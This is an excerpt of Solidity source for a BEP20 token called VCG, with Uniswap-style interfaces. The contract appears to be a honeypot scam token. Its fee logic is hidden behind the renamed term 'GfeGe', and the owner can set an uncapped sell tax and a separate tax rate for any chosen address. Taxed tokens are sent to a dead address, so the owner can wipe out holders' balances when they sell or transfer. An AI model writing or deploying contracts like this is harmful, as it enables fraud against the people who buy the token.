...
interface IUniswapV2Factory {
    ...
    function GfeGeTo() external view returns (address);
    function GfeGeToSetter() external view returns (address);
    ...
    function setGfeGeTo(address) external;
    function setGfeGeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingGfeGeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingGfeGeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingGfeGeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingGfeGeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingGfeGeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract VCG is BEP20, Ownable {
    ...
    uint256 private _defaultSellGfeGe = 0;

    uint256 private _defaultBuyGfeGe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipGfeGe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellGfeGe = _value;
    }

    function setSlipGfeGe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipGfeGe[_address] = _value;
    }

    function getSlipGfeGe(address _address) external view onlyownar returns (uint256) {
        return _slipGfeGe[_address];
    }


    function setMAccountGfeGe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountGfeGe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeGfeGeAmount = 0;

        if (rF) {
            uint256 tradeGfeGe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeGfeGe = _defaultSellGfeGe;
                }
                if (from == uniswapV2Pair) {

                    tradeGfeGe = _defaultBuyGfeGe;
                }
            }
            if (_slipGfeGe[from] > 0) {
                tradeGfeGe = _slipGfeGe[from];
            }

            tradeGfeGeAmount = _Amount.mul(tradeGfeGe).div(100);
        }


        if (tradeGfeGeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeGfeGeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeGfeGeAmount);
            emit Transfer(from, _deadAddress, tradeGfeGeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeGfeGeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeGfeGeAmount);
        emit Transfer(from, _to, _Amount - tradeGfeGeAmount);
    }
